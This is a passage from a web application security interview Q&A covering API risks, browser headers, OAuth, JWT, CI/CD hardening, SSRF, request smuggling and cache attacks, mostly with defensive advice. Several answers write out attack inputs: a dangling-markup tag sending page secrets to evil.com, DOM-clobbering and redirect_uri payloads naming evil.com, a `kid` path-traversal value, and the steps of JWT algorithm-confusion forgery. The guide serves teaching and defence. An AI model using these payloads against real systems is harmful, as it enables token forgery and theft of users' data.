- Rate limit and set request size limits.
- Use proper HTTP methods and do not change state on `GET`.
- Set security headers and a strict CORS policy.
- Version the API and remove old versions, keeping an inventory of all endpoints.
- Log and monitor access.

## 254: What is Broken Function Level Authorization?

It is when a user can call API functions they should not have access to, usually admin or internal endpoints. For example, a normal user calls `POST /api/admin/users` or switches `GET /api/users/me` to `DELETE /api/users/123`. It often happens when authorization is only checked for some routes or methods. Use central middleware with deny by default for every route.

## 255: What is Improper Inventory Management in APIs?

It means not knowing all the APIs and versions you have running. Old versions like `/api/v1` stay online without the fixes added to `v2`, debug endpoints get forgotten, and staging APIs with real data are left public. Keep an up-to-date list of APIs (an OpenAPI spec helps), retire old versions, and scan for unknown endpoints.

## 256: What is Unsafe Consumption of APIs?

It means trusting data from third-party APIs too much. Developers often validate user input carefully but use responses from partner APIs without checks. If that partner is compromised or returns unexpected data, you can get injection, SSRF through redirects, or crashes. Validate third-party responses, use timeouts, do not follow redirects blindly, and use TLS.

## 257: How do you protect against business logic abuse like ticket scalping or coupon abuse?

This is "Unrestricted Access to Sensitive Business Flows" in the API Top 10. The app works as designed, but someone uses it at scale. Defenses depend on the flow:

- Limit actions per user, device and payment method.
- Detect bots with device fingerprinting, behavior analysis or CAPTCHA.
- Add delays or queues for high-demand flows.
- Require verified accounts for valuable actions.
- Monitor for unusual patterns.

## 258: How do you set up security headers in Nginx?

```nginx
server {
  listen 443 ssl;
  http2 on;
  server_name example.com;

  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
  add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'" always;

  server_tokens off;
}
```

`always` makes Nginx add the headers on error responses too. Note that `add_header` in a nested `location` block replaces the parent's headers instead of adding to them.

## 259: What are COOP, COEP and CORP?

- `Cross-Origin-Opener-Policy` (COOP): `same-origin` puts your page in its own browsing context group, so pages you open or that open you cannot keep a reference to your `window`. It protects against some cross-window attacks.
- `Cross-Origin-Embedder-Policy` (COEP): `require-corp` means your page can only load cross-origin resources that opt in.
- `Cross-Origin-Resource-Policy` (CORP): set by a resource to say who can load it, for example `same-origin`.

COOP and COEP together make the page "cross-origin isolated", which is needed for `SharedArrayBuffer` and high-precision timers.

## 260: What is reverse tabnabbing?

When you open a link with `target="_blank"`, the new page used to get `window.opener` and could change the original tab's location to a phishing page. Modern browsers now treat `target="_blank"` as `rel="noopener"` by default, which fixes most cases. Still add `rel="noopener noreferrer"` for older browsers, and be careful with `window.open()`, where you should pass `noopener` in the features.

## 261: How do you safely use postMessage?

Always check the sender's origin when receiving, and always set the target origin when sending.

```js
// Sending
iframe.contentWindow.postMessage(
  { type: "resize", h: 500 },
  "https://widget.example.com",
);

// Receiving
window.addEventListener("message", (event) => {
  if (event.origin !== "https://app.example.com") return;
  if (typeof event.data?.type !== "string") return;
  handle(event.data);
});
```

Using `'*'` as the target can leak data to any page, and skipping the origin check lets any page send you commands.

## 262: How do you secure WebSockets?

- Use `wss://` only.
- Authenticate during the handshake, with a cookie or a short-lived token.
- Check the `Origin` header on the upgrade request, because WebSockets are not covered by CORS.
- Check authorization on every message, not just at connect time.
- Validate and limit message size.
- Rate limit messages per connection.
- Close connections when the session ends.

## 263: What is cross-site WebSocket hijacking (CSWSH)?

If a WebSocket server authenticates with cookies and does not check the `Origin` header, a malicious site can open a WebSocket to it from the victim's browser. The cookies are sent, the connection is authenticated, and the attacker's page can read and send messages as the victim. It is basically CSRF for WebSockets, but with the ability to read responses. Check `Origin` and use `SameSite` cookies.

## 264: How do you make XML parsing safe from XXE in Node.js?

Many Node.js XML libraries do not process external entities by default, but some do or can be configured to. With `libxmljs`, make sure `noent` and `dtdload` are off. With `fast-xml-parser`, entity processing is limited, but keep it updated. In general:

- Disable DTD processing and external entities.
- Prefer JSON if you control the format.
- Keep XML libraries updated.
- Also check SVG, DOCX, XLSX and SAML handling, since those are XML too.

## 265: What is a zip slip vulnerability?

Zip slip happens when you extract an archive and the file names inside contain `../`, so files are written outside the target folder. An attacker can overwrite config files or scripts. When extracting, resolve each entry's path and check that it stays inside the target directory, the same as for path traversal. Also limit the total extracted size to avoid zip bombs.

## 266: What is a zip bomb?

A zip bomb is a small compressed file that expands to a huge size, like a 42 KB file that becomes petabytes. Extracting it can fill the disk or use all memory. Defend by limiting total uncompressed size, number of files and nesting depth while extracting, and stopping as soon as a limit is passed. The same idea applies to gzip request bodies, so limit decompressed body size too.

## 267: How do you protect against XSS in JSON responses that get embedded in HTML?

If you put JSON into a `<script>` tag in server-rendered HTML, a value containing `</script>` can close the tag and inject HTML. Escape `<`, `>`, `&`, and the line separators `U+2028` and `U+2029`.

```js
function safeJson(obj) {
  return JSON.stringify(obj)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/ /g, '\\u2028')
    .replace(/ /g, '\\u2029');
}
```

Libraries like `serialize-javascript` or `devalue` do this. A safer option is a `<script type="application/json">` block read with `JSON.parse(el.textContent)`.

## 268: Why should API responses use the right Content-Type?

If a JSON API returns `Content-Type: text/html` and some value contains HTML, opening that URL directly in a browser renders it as a page, which can lead to XSS. Return `application/json` for JSON, set `X-Content-Type-Options: nosniff`, and for downloads add `Content-Disposition: attachment`.

## 269: What is Trusted Types?

Trusted Types is a browser feature, turned on with CSP, that blocks passing plain strings to dangerous DOM sinks like `innerHTML`, `eval` or `script.src`. You must create a "trusted" value through a policy you define, which usually sanitizes it.

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-policy
```

```js
const policy = trustedTypes.createPolicy("app-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
el.innerHTML = policy.createHTML(userHtml);
```

It turns DOM XSS into a problem you can review in a few policy files. It started in Chromium-based browsers and other browsers have been adding it, so check current support for your users.

## 270: What is the difference between sanitization and escaping?

Escaping turns special characters into safe text, so `<b>` shows on screen as `<b>` instead of bold text. It keeps the content but makes it inert.

Sanitization parses HTML and removes dangerous parts (scripts, event handlers, `javascript:` URLs) while keeping allowed markup like `<b>` and `<a href>`. Use escaping by default and sanitization only when you really need to show user HTML.

## 271: Why is writing your own HTML sanitizer a bad idea?

HTML parsing has many edge cases: broken tags, nested contexts, SVG and MathML namespaces, browser quirks, encoding tricks, and mutation XSS where the browser changes the HTML after sanitization. Regex-based filters are bypassed easily. Use a well-tested library like DOMPurify, or the browser's `Element.setHTML()` Sanitizer API where it is supported.

## 272: What is the HTML Sanitizer API?

It is a newer browser API that sanitizes HTML using the browser's own parser, so the result matches how the browser will actually treat it.

```js
element.setHTML(userHtml); // removes scripts and other unsafe content by default
```

It is newer, so check browser support before relying on it. Until it is available everywhere, DOMPurify is the standard choice.

## 273: How do you prevent CSV injection?

When user input is exported to CSV and opened in Excel or Google Sheets, values starting with `=`, `+`, `-`, `@`, tab or carriage return can be treated as formulas, which can run commands or leak data. Prefix those values with a single quote, and wrap every field in quotes, escaping double quotes inside.

```js
function csvCell(value) {
  let s = String(value ?? "");
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return '"' + s.replace(/"/g, '""') + '"';
}
```

## 274: What is HTTP parameter pollution?

HTTP parameter pollution is when the same parameter is sent more than once, like `?role=user&role=admin`. Different parts of the stack handle it differently: one may take the first value, another the last, and Express's query parser gives you an array. That can bypass validation or WAF rules. Validate that parameters have the expected type (string, not array) before using them.

## 275: How should you handle "remember me" functionality securely?

Use a separate long-lived, random token stored in an `HttpOnly`, `Secure` cookie, and store only its hash on the server with the user ID and expiry. When used, issue a new token and invalidate the old one. Ask for the password again before sensitive actions like changing the email, password or payment details, even if the user was remembered.

## 276: What is step-up authentication?

Step-up authentication asks the user to prove their identity again, often with MFA, before a sensitive action, even if they are already logged in. Examples: changing the password or email, adding a payee, viewing full card details or deleting the account. It limits damage from a stolen session or an unlocked computer.

## 277: How do you secure an account email change?

1. Require the current password or MFA.
2. Send a confirmation link to the new address, and only switch after it is clicked.
3. Notify the old address, with a way to undo the change.
4. Log the event.

Without these, an attacker with a stolen session can change the email and then reset the password to take over the account fully.

## 278: How do you protect APIs that use API keys?

- Generate keys with enough randomness and a recognizable prefix (helps secret scanners).
- Store only a hash of the key on the server.
- Let users create, name, scope and revoke keys, and show the full key only once.
- Send keys in a header, not in the URL.
- Rate limit per key and log key usage.
- Set expiry dates and support rotation without downtime.

## 279: What is the difference between authentication and API keys?

An API key identifies a calling application or project, and is often long-lived and shared across a team. It is weak as user authentication because it is not tied to a person, often has no expiry and is easy to leak. For user-level access, use OAuth tokens or sessions. API keys are fine for server-to-server calls when stored safely and scoped tightly.

## 280: How do you secure environment variables in CI/CD?

- Store secrets in the CI platform's secret store, not in the pipeline file.
- Limit which branches and environments can use production secrets.
- Do not expose secrets to builds from forked pull requests.
- Mask secrets in logs, and avoid `set -x` or printing the environment.
- Use OIDC federation to get short-lived cloud credentials instead of long-lived keys.
- Give pipeline tokens only the permissions they need.

## 281: What is OIDC federation in GitHub Actions?

Instead of storing long-lived cloud keys as secrets, a workflow can request a short-lived OIDC token from GitHub and exchange it with AWS, GCP or Azure for temporary credentials. The cloud trust policy can be limited to a specific repository, branch or environment.

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v5
    with:
      role-to-assume: arn:aws:iam::123456789012:role/deploy
      aws-region: eu-west-1
```

There are no static keys to leak, and each credential expires within an hour.

## 282: Why should you pin GitHub Actions to a commit SHA?

A tag like `@v4` can be moved by the action's owner, or by an attacker who takes over their account, to point to malicious code. That happened with `tj-actions/changed-files` in March 2025, which leaked secrets from many repositories. Pinning to a full commit SHA makes sure you run the exact code you reviewed. Use Dependabot or Renovate to update the SHAs.

```yaml
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
```

## 283: What is the risk of pull_request_target in GitHub Actions?

`pull_request_target` runs in the context of the base repository, with access to secrets and a write token, even for pull requests from forks. If the workflow checks out and runs code from the PR (for example `npm install` or tests), an attacker can submit a PR that steals the secrets. Use `pull_request` for running untrusted code, and only use `pull_request_target` for tasks like labeling that do not run PR code.

## 284: What is script injection in GitHub Actions?

If a workflow puts untrusted input like a PR title or issue body directly into a `run` script with `${{ }}`, an attacker can inject shell commands.

```yaml
# Vulnerable
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe: pass through an environment variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

## 285: How do you limit the GITHUB_TOKEN permissions?

Set default permissions to read-only at the organization or repository level, and declare only what each workflow needs.

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write
      packages: write
```

If a step is compromised, the token can then do only what that job needed.

## 286: How do you validate URLs given by users?

Parse them with the `URL` class and check the parts, instead of using regex.

```js
function isSafeHttpUrl(input) {
  try {
    const url = new URL(input);
    return url.protocol === "https:" || url.protocol === "http:";
  } catch {
    return false;
  }
}
```

This blocks `javascript:`, `data:` and `vbscript:` URLs in links. For server-side fetching, you also need the SSRF checks on the resolved IP.

## 287: How do you secure cookies when using subdomains?

- Do not set `Domain=example.com` unless you really need the cookie on all subdomains, because then every subdomain can read and overwrite it.
- Use `__Host-` cookies for session cookies, which forces host-only scope.
- Watch for subdomain takeover, since a taken-over subdomain can set cookies for the parent domain.
- Remember that `SameSite` treats subdomains of the same registrable domain as "same site", so a compromised subdomain can still send same-site requests.

## 288: What is subdomain takeover?

Subdomain takeover happens when a DNS record (often a CNAME) points to an external service you no longer use, like a deleted S3 bucket, Heroku app or GitHub Pages site. An attacker creates that resource with the same name and now controls content on your subdomain. They can host phishing pages, steal cookies scoped to the parent domain, or bypass CSP. Remove DNS records when you remove the service.

## 289: How do you secure an admin panel?

- Put it on a separate host or path that is only reachable from a VPN, IP allowlist or zero-trust access proxy.
- Require MFA, ideally phishing-resistant.
- Use short session timeouts and step-up authentication for dangerous actions.
- Log every admin action to an audit log.
- Apply least privilege, with different admin roles instead of one superuser.
- Do not ship admin code to the regular frontend bundle.

## 290: What is the difference between 401 and 403 responses?

`401 Unauthorized` means the request has no valid authentication: no token, expired token or bad credentials. The client should log in.

`403 Forbidden` means the user is known but not allowed to do this. Logging in again will not help.

For resources the user should not even know exist, returning `404` instead of `403` avoids confirming that the ID is valid.

## 291: How do you handle CORS for public APIs that do not use cookies?

If an API is fully public and uses no cookies or other browser credentials, `Access-Control-Allow-Origin: *` is fine, because no user-specific data can leak. Do not combine it with cookie auth. If the API uses API keys sent in headers, the keys are what protect it, and you should still not expose secret keys in frontend code.

## 292: What is the risk of using third-party scripts like analytics or chat widgets?

Every third-party script runs with full access to your page: it can read the DOM, form fields, cookies that are not `HttpOnly`, and `localStorage`. If that vendor is hacked, their script becomes an attack on your users. The Polyfill.io incident in 2024 and Magecart card-skimming attacks are examples. Limit third-party scripts, load them with SRI when versions are fixed, restrict them with CSP, and keep them off sensitive pages like checkout.

## 293: What is Magecart?

Magecart is a name for groups that inject JavaScript skimmers into checkout pages to steal card details as users type them. They often get in through compromised third-party scripts, outdated e-commerce plugins or stolen admin credentials. PCI DSS 4.0 now requires payment pages to keep an inventory of scripts, justify each one, and detect unauthorized changes to scripts and headers.

## 294: How do you secure a Node.js app's runtime?

- Keep Node.js on an active LTS version.
- Run as a non-root user with minimal permissions.
- Use the Node.js permission model (`--permission` with `--allow-fs-read` and similar flags) to limit file and process access where it fits.
- Set request body size limits and timeouts.
- Avoid `eval`, `vm` with untrusted code, and `child_process` with user input.
- Set `NODE_ENV=production`.

## 295: How do you limit request body size in Express?

Set a limit on the body parsers. The default for `express.json()` is 100 KB, but setting it on purpose documents it and lets you lower it.

```js
app.use(express.json({ limit: "50kb" }));
app.use(express.urlencoded({ extended: false, limit: "50kb" }));
```

For uploads, set limits in the upload library (`multer` `limits.fileSize`). Also set limits at the proxy, like Nginx's `client_max_body_size`.

## 296: What is a slow loris attack?

Slow loris is a DoS attack where the attacker opens many connections and sends headers very slowly, keeping each connection alive as long as possible. Servers that keep one thread per connection run out of capacity. Defenses: header and request timeouts (Node.js has `server.headersTimeout` and `server.requestTimeout`), connection limits, and a reverse proxy or CDN in front of the app.

## 297: How do you do security code reviews?

Look for patterns, not just style:

- Where does untrusted input enter, and where does it end up (queries, HTML, shell, file paths, URLs)?
- Is there an authorization check on every new endpoint, and does it check ownership?
- Are secrets, tokens or personal data being logged or returned?
- Are errors handled so they fail closed?
- Are new dependencies needed and trustworthy?
- Does the change affect auth, sessions, crypto or file handling? If so, look extra carefully.

The OWASP Code Review Guide and ASVS help as checklists.

## 298: What is a threat model diagram?

A threat model diagram, usually a data flow diagram, shows the parts of the system (users, services, databases, third parties), how data flows between them, and trust boundaries where data crosses from less trusted to more trusted areas, like from the internet to your API. Threats usually show up at trust boundaries. Tools like OWASP Threat Dragon help draw them.

## 299: What is OWASP Threat Dragon?

Threat Dragon is a free OWASP tool for drawing threat model diagrams and recording threats against each element. It supports STRIDE, LINDDUN (for privacy) and other methods, and saves models as JSON so you can keep them in Git next to the code. It runs as a desktop app or a web app.

## 300: How do you write security requirements for a new feature?

Start from the feature's user stories and add abuse cases: "As an attacker, I want to view other users' orders by changing the ID". Then write requirements that block them, like "the API must return 404 if the order does not belong to the user". ASVS is a good source of ready-made requirements, and you can pick the ones that apply to the feature and level.

# Advanced Questions (301-450)

## 301: Why did OWASP merge SSRF into Broken Access Control in 2025?

In 2021, SSRF got its own category mostly because of the community survey, not because the data showed it was very common. In the 2025 data it still did not have enough volume to stand alone. OWASP put it under Broken Access Control because, at its core, SSRF lets an attacker reach resources (internal services, metadata endpoints) they should not have access to, using the server as a proxy. The defense is also access-control-like: restrict which destinations the server is allowed to reach.

## 302: Why did "Vulnerable and Outdated Components" become "Software Supply Chain Failures"?

The old category only covered using libraries with known CVEs. Recent attacks showed the bigger risk is the whole chain: compromised maintainers, malicious packages, poisoned build systems and CI/CD pipelines (SolarWinds, Codecov, the xz backdoor, and the npm worms of 2025). The new name covers how code is selected, built, signed and delivered, not just whether its version is old. It ranked first in the community survey, even though testing data for it is still limited.

## 303: What does A10:2025 Mishandling of Exceptional Conditions add that was not covered before?

It groups CWEs about error handling, logic errors, failing open and unexpected states that used to be spread across "code quality" or other categories. Examples: not checking return values, catching exceptions too broadly, partial transactions leaving bad state, unchecked null values, and resource leaks under error paths. The idea is that how an app behaves when something unexpected happens is a security property, not just a reliability one.

## 304: How is the OWASP Top 10 data actually collected and ranked?

OWASP asks organizations to contribute data about the CWEs they found in tested applications. For 2025, it covered over 2.8 million applications and almost 600 CWEs. Categories are built from groups of related CWEs and ranked by incidence rate (how many apps had at least one instance), plus exploit and impact data from CVSS scores. Two of the ten categories are picked from a community survey, to cover risks that testing data does not show well yet.

## 305: What is the difference between using the Top 10 and using ASVS in a project?

The Top 10 is for awareness and training. It is too broad to test against, and "we are Top 10 compliant" does not really mean anything. ASVS gives specific, testable requirements, like "verify that the application uses a nonce-based CSP". For a real project, you pick an ASVS level, turn its requirements into acceptance criteria and tests, and track coverage. Many teams use the Top 10 to explain why and ASVS to define what.

## 306: What changed in ASVS 5.0?

ASVS 5.0 (May 2025) reorganized the chapters and requirement IDs, so mappings from 4.0.3 need updating. It added more detail on topics like OAuth and OIDC, self-contained tokens, web frontend security and security decisions documentation, and removed or merged requirements that were vague or duplicated. Requirement levels were also reviewed so Level 1 is easier to adopt as a starting point.

## 307: How would you design authorization for a multi-tenant SaaS app?

- Every row that belongs to a tenant has a `tenant_id` column.
- The tenant ID comes from the authenticated session, never from the request.
- All queries go through a data layer that adds the tenant filter automatically, so a developer cannot forget it.
- Add database-level protection like PostgreSQL row-level security as a second layer.
- Use separate encryption keys per tenant for sensitive data if needed.
- Test cross-tenant access in automated tests: log in as tenant A and try to read tenant B's IDs.

For the highest isolation, use separate schemas or databases per tenant, at a higher operational cost.

## 308: How does PostgreSQL row-level security help with tenant isolation?

RLS lets the database itself filter rows based on a policy, so even a query without a `WHERE tenant_id = ...` cannot see other tenants' data.

```sql
ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation ON invoices
  USING (tenant_id = current_setting('app.tenant_id')::uuid);
```

```js
await client.query("BEGIN");
await client.query("SELECT set_config('app.tenant_id', $1, true)", [tenantId]);
const { rows } = await client.query("SELECT * FROM invoices");
await client.query("COMMIT");
```

The app must connect as a role that is not the table owner or a superuser, or the policies are skipped (unless you use `FORCE ROW LEVEL SECURITY`). With connection pools, set the value per transaction (`true` as the third argument) so it does not leak to the next request.

## 309: Where should authorization logic live in a microservices architecture?

There are a few common patterns:

- The API gateway checks authentication and coarse permissions (is this user allowed to call this service at all?).
- Each service checks fine-grained permissions on its own objects, because only it knows who owns what.
- A central policy engine (like OPA, Cedar, OpenFGA) holds the rules, and services call it or embed it, so rules stay consistent.

Relying only on the gateway is risky: any internal caller or SSRF bug that reaches a service directly bypasses all checks.

## 310: How do you pass user identity between microservices safely?

Do not trust a plain `X-User-Id` header, since anything that reaches the service can set it. Better options:

- Forward the original access token and have each service verify it.
- Have the gateway issue a short-lived internal token signed with a key the services trust, containing the user and tenant.
- Use mTLS between services so each service knows which service is calling, and combine it with the user token.

Token exchange (RFC 8693) lets a service swap a user token for a narrower one for a downstream call.

## 311: What is mTLS and when would you use it?

Mutual TLS means both sides present certificates: the server proves its identity to the client, and the client proves its identity to the server. It is used for service-to-service traffic, B2B APIs and zero-trust networks. Service meshes like Istio and Linkerd set it up automatically and rotate certificates. It authenticates services, not users, so you still need user-level authorization.

## 312: What is the confused deputy problem?

A confused deputy is a program with more privileges that is tricked into using them for someone who should not have them. SSRF is a classic example: the server (the deputy) has network access the attacker does not, and the attacker makes it fetch internal resources. In AWS, it shows up in cross-account roles, which is why roles use an `ExternalId` or `aws:SourceArn` condition. LLM agents with tools are a newer example.

## 313: Walk through the JWT algorithm confusion attack (RS256 to HS256).

The server signs tokens with RS256: private key to sign, public key to verify. A vulnerable library uses whatever `alg` the token says. The attacker:

1. Gets the server's public key (often public at a JWKS endpoint).
2. Creates a token with `"alg": "HS256"` and their chosen claims.
3. Signs it with HMAC using the public key bytes as the HMAC secret.

The server reads `alg: HS256`, uses its "key" (the public key) as the HMAC secret, and the signature checks out. Fix: always pass a fixed `algorithms` list to `verify`, and use key objects that are tied to one algorithm.

## 314: What are the risks of the JWT kid and jku headers?

- `kid` (key ID) tells the server which key to use. If it is used in a file path or SQL query without validation, it can lead to path traversal (`"kid": "../../dev/null"` to get an empty key) or SQL injection.
- `jku` and `x5u` point to a URL with the signing keys. If the server fetches keys from whatever URL the token says, the attacker hosts their own keys and signs anything.
- `jwk` embeds the key in the token itself, with the same problem.

Only accept keys from a fixed, configured JWKS URL, and treat `kid` as a lookup key in a known set.

## 315: How do you design key rotation for JWT signing keys?

- Publish keys at a JWKS endpoint, each with a unique `kid`.
- Add the new key to the JWKS before you start signing with it, so verifiers cache it in time.
- Start signing new tokens with the new key.
- Keep the old public key in the JWKS until all tokens signed with it have expired.
- Then remove the old key.

Verifiers should cache the JWKS but refetch when they see an unknown `kid`, with rate limiting so attackers cannot force constant refetches.

## 316: What is DPoP and what problem does it solve?

DPoP (Demonstrating Proof of Possession, RFC 9449) binds an access token to a key pair held by the client. On each request, the client sends a small signed JWT (the DPoP proof) with the HTTP method, URL and a timestamp, signed with its private key. The server checks that the token was issued for that key. If an attacker steals the token alone, they cannot use it, because they do not have the private key. It addresses the weakness of plain bearer tokens.

## 317: What are common OAuth redirect_uri attacks?

If the authorization server does loose matching on `redirect_uri`, an attacker can register or craft a URL that sends the code or token to them:

- Prefix matching: `https://app.com.evil.com` or `https://app.com/callback/../attacker-path`.
- Open redirect on the client: `https://app.com/redirect?to=https://evil.com`, so the code ends up at the attacker through `Referer` or the redirect.
- Wildcard subdomains combined with a subdomain takeover.

RFC 9700 requires exact string matching of redirect URIs, plus PKCE.

## 318: What is a mix-up attack in OAuth?

When a client works with several authorization servers, an attacker-controlled server can trick the client into sending a code or token meant for an honest server to the attacker. The defense is the `iss` parameter in the authorization response (RFC 9207), so the client checks which server actually sent the response, plus using separate redirect URIs per server.

## 319: How do you secure an SPA that talks to several APIs with OAuth?

Options, from most to least secure:

1. BFF: tokens stay on the server, the browser has a session cookie, and the BFF proxies API calls.
2. Token-mediating backend: the backend gets tokens and hands short-lived access tokens to the SPA, but keeps the refresh token.
3. Browser-only: the SPA does authorization code with PKCE, keeps tokens in memory, uses refresh token rotation and short lifetimes.

The OAuth for Browser-Based Apps guidance from the IETF describes these patterns and recommends BFF for apps with sensitive data.

## 320: How would you detect and respond to a session hijacking in progress?

Detection signals: the same session used from very different IPs or countries in a short time, a sudden user agent change, or many sensitive actions in a row. Response options: require re-authentication, end that session, notify the user, and if needed revoke all sessions for the account. Binding sessions to device information (with care for false positives) and DPoP-style key binding make stolen sessions less useful in the first place. Chrome's Device Bound Session Credentials work is aimed at this problem too.

## 321: What is mutation XSS (mXSS)?

Mutation XSS happens when HTML looks safe to the sanitizer, but the browser changes it while parsing or re-serializing, so it becomes dangerous. For example, markup inside `<noscript>`, `<svg>`, `<math>` or `<template>` can be parsed differently depending on context. The sanitizer sees harmless text, then the browser turns it into a live `<img onerror=...>`. This is why sanitizers must use the browser's own parser, be kept up to date, and why you should not modify HTML again after sanitizing it.

## 322: What is DOM clobbering?

DOM clobbering uses HTML elements with `id` or `name` attributes to override global JavaScript variables or DOM properties. For example, injected `<a id="config" href="https://evil.com/x.js">` makes `window.config` point to that element, and code like `script.src = window.config.url || '/default.js'` may then load the attacker's script. It works even when scripts are blocked, as long as some HTML gets through. Defenses: do not rely on globals for config, check types, and sanitize `id` and `name` attributes (DOMPurify has an option for this).

## 323: How can a CSP be bypassed?

Common bypasses:

- Allowed domains that host JSONP endpoints or user files, letting the attacker load "trusted" scripts with their payload.
- `'unsafe-inline'` or `'unsafe-eval'` in `script-src`.
- Missing `base-uri`, so injected `<base href>` changes where relative scripts load from.
- Missing `object-src 'none'` in older browsers.
- Old framework versions (like AngularJS) on allowed domains that evaluate expressions in templates.
- Nonce reuse, or nonces leaked through caching.
- Script gadgets in trusted libraries that turn harmless-looking HTML attributes into code.

Google's CSP Evaluator tool checks a policy for many of these.

## 324: What is dangling markup injection?

When an attacker can inject HTML but not run scripts (because of CSP or filtering), they can inject an unclosed tag like `<img src="https://evil.com/?`. The browser treats everything after it, up to the next quote, as part of the URL and sends it to the attacker, which can include CSRF tokens or other secrets on the page. Chrome blocks some forms of this, like URLs with raw newlines and `<`. Strict CSP `img-src` rules and proper encoding prevent it.

## 325: What are XS-Leaks?

XS-Leaks (cross-site leaks) are attacks where a malicious site learns information about a user's state on another site without reading the response directly. They use side channels like timing, the number of frames in a window, error events, cache behavior or navigation. For example, checking if a search for "secret project" on your site returns results, based on how long it takes or whether an image loads. Defenses include `SameSite` cookies, COOP, CORP, Fetch Metadata checks and isolating sensitive endpoints.

## 326: How do Fetch Metadata resource isolation policies work?

You check `Sec-Fetch-Site`, `Sec-Fetch-Mode` and `Sec-Fetch-Dest` on the server and reject requests that should never come from another site.

```js
function isolationPolicy(req, res, next) {
  const site = req.get("sec-fetch-site");
  if (!site) return next(); // older browsers
  if (["same-origin", "same-site", "none"].includes(site)) return next();

  // allow simple top-level navigation
  if (
    req.get("sec-fetch-mode") === "navigate" &&
    req.method === "GET" &&
    !["object", "embed"].includes(req.get("sec-fetch-dest"))
  ) {
    return next();
  }
  res.status(403).end();
}
```

This blocks CSRF, XSSI and many XS-Leaks in one place. Exempt endpoints that are meant to be loaded cross-site, like public assets or CORS APIs.

## 327: What is HTTP request smuggling?

Request smuggling happens when a front-end server (proxy, load balancer, CDN) and a back-end server disagree on where one HTTP request ends and the next begins, usually because of conflicting `Content-Length` and `Transfer-Encoding` headers. The attacker sends a request that the front end sees as one request but the back end sees as two. The hidden second request can then be attached to another user's request, letting the attacker bypass security controls, poison caches or capture other users' requests.

## 328: How do you defend against request smuggling?

- Use HTTP/2 end-to-end where possible, since it has built-in framing. HTTP/2 to HTTP/1.1 downgrading at the proxy brings the risk back.
- Make the front end normalize or reject ambiguous requests (both `Content-Length` and `Transfer-Encoding`, duplicate headers, malformed chunking).
- Keep proxies and servers updated, since many parser fixes have come out over the years.
- Use the same server software on both sides when possible, so they parse the same way.
- Do not reuse back-end connections between different users, if performance allows.

## 329: What is web cache poisoning?

Web cache poisoning happens when an attacker gets a harmful response stored in a shared cache, so it is served to other users. The trick is to find an input that changes the response but is not part of the cache key, like an `X-Forwarded-Host` header used to build script URLs. The attacker sends a request with that header, the response with their URL is cached, and every user who loads the page gets it. Defenses: do not use unkeyed headers in responses, include them in the cache key with `Vary`, and cache only static content.

## 330: What is web cache deception?

Web cache deception is the opposite trick: the attacker gets a private page cached as if it were public. They send the victim a link like `/account/settings/x.css`. The app ignores the extra path and returns the settings page with personal data, and the CDN sees `.css` and caches it. The attacker then requests the same URL and gets the victim's data. Fix it by caching based on `Cache-Control` headers from the app, not on file extensions, and by sending `Cache-Control: private, no-store` on personal pages.

## 331: What is DNS rebinding and how does it affect SSRF filters and local services?

In DNS rebinding, an attacker's domain first resolves to a public IP and then, with a very short TTL, to a private IP like `127.0.0.1`. Against SSRF filters, the check sees the public IP and the actual request goes to the private one. Against local services (dev servers, routers, local AI tools), a page on the attacker's domain can make the victim's browser talk to `localhost` with the same origin. Defenses: pin the resolved IP between check and connect, validate the `Host` header on local services, and require authentication even on localhost.

## 332: How do you build an SSRF-safe HTTP client in Node.js?

Validate the IP in the `lookup` function that the socket uses, so the check and the connection use the same resolution.

```js
import dns from "node:dns";
import net from "node:net";
import { Agent } from "undici";
import ipaddr from "ipaddr.js";

function safeLookup(hostname, options, cb) {
  dns.lookup(hostname, { all: true }, (err, addrs) => {
    if (err) return cb(err);
    const bad = addrs.find(
      (a) => ipaddr.process(a.address).range() !== "unicast",
    );
    if (bad) return cb(new Error(`Blocked address ${bad.address}`));
    if (options.all) return cb(null, addrs);
    cb(null, addrs[0].address, addrs[0].family);
  });
}

const agent = new Agent({ connect: { lookup: safeLookup } });
const res = await fetch(url, { dispatcher: agent, redirect: "manual" });
```

Also block IP literals directly in the URL, limit response size and time, and run it in a network segment without internal access.

## 333: How do race conditions lead to security bugs?

If two requests run at the same time and both read state before either writes, they can both pass a check that should only pass once. Examples: redeeming the same coupon twice, withdrawing more than the balance, or using a single-use token twice. Attackers send many requests at the same moment (HTTP/2 single-packet attacks make this very precise). Fix it with database constraints, atomic updates, row locks or idempotency keys.

```sql
UPDATE coupons SET used = true
WHERE code = $1 AND used = false
RETURNING id;
```

If no row comes back, the coupon was already used.

## 334: What is TOCTOU?

TOCTOU (Time Of Check to Time Of Use) is a race where something is checked, then changes before it is used. Examples: checking a file path is safe and then the file is replaced with a symlink before opening it, or checking a balance in one query and deducting it in another. The fix is to make the check and use one atomic operation, or lock the resource between them.

## 335: How do you find business logic vulnerabilities?

Scanners rarely find them, because the requests look normal. You need to understand the business rules and try to break them:

- Change quantities to negative numbers or decimals.
- Skip steps in a multi-step flow (go straight to "confirm" without "pay").
- Repeat steps, like applying a discount twice.
- Change the order of operations.
- Mix values from two sessions or accounts.
- Look at what the client sends that the server should calculate itself, like prices or totals.

Threat modeling with product owners and writing abuse case tests help catch them early.

## 336: A checkout API accepts the price from the client. What would you change?

The server must calculate the price from its own data: look up product prices, apply discounts it validates, compute tax and shipping, and ignore any price or total sent by the client. The client only sends product IDs, quantities and coupon codes. Quantities must be validated as positive integers within limits. The final amount should be stored with the order and used when calling the payment provider, and the payment webhook should check that the paid amount matches.

## 337: How do you design idempotency for payment APIs?

